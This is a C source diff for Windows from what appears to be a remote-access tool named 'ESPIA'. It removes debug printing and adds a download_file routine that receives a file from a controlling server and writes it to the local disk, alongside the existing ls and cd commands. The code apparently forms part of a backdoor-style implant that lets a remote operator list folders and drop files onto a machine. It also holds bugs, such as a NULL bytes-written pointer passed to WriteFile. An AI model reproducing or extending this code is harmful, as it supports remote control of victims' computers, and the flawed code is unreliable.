@@ -51,11 +51,6 @@ void ls(INT (*callback)(PWSTR buffer, INT size_buffer)) {
     /* Iterate over files/folders */
     LARGE_INTEGER filesize;
     do {
-
-        printf("%ls\n", file_data.cFileName);
-        for(int j = 0 ; j < wcslen(file_data.cFileName) ; j++) printf("%02X ", file_data.cFileName[j]);
-        printf("\n");
-
         /* If current file/folder is a directory */
         if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             StringCbPrintfW(temp_dir, sizeof(temp_dir), L"%s\t\t\t\t<DIR>\n", file_data.cFileName);
@@ -78,4 +73,43 @@ INT cd(PWSTR path, PWSTR buffer, INT size_buffer) {
         return CD_ERROR;
     }
     return ESPIA_OK;
+}
+
+INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buffer), INT (*output_stream)(PWSTR buffer, INT size_buffer)) {
+    WCHAR comm_buff[9] = L"\0";
+    CHAR file_recv_buff[1024] = "\0";
+    (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
+
+    /* Converts the file size to int */
+    int sum = 0, dig = 0, pow = wcslen((PWSTR)file_recv_buff) - 1;
+    for (int i = 0 ; i < wcslen((PWSTR)file_recv_buff) ; i++) {
+        dig = *(((PWSTR)file_recv_buff) + i) - L'0';
+        for (int j = 0 ; j < pow ; j++)
+            dig *= 10;
+        sum += dig;
+        pow--;
+    }
+
+    /* Create the file */
+    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {                            // If failed. Notify the server.
+        StringCbCatW(comm_buff, sizeof(comm_buff), L"den<end>");
+        (*output_stream)(comm_buff, sizeof(comm_buff));
+        return FILE_CREATION_FAIL;
+    }
+    StringCbCatW(comm_buff, sizeof(comm_buff), L"ack<end>");        // Else continue
+    (*output_stream)(comm_buff, sizeof(comm_buff));
+
+    /* Recieve and write */
+    int recieved_bytes = 0, full_bytes = 0;
+    memset(file_recv_buff, 0, sizeof(file_recv_buff));
+    while (full_bytes != sum) {
+        recieved_bytes = (*input_stream)(file_recv_buff, sizeof(file_recv_buff));
+        WriteFile(hFile, file_recv_buff, recieved_bytes, NULL, nullptr);
+        full_bytes += recieved_bytes;
+    }
+
+    /* Close the handle */
+    CloseHandle(hFile);
+    return 0;
 }
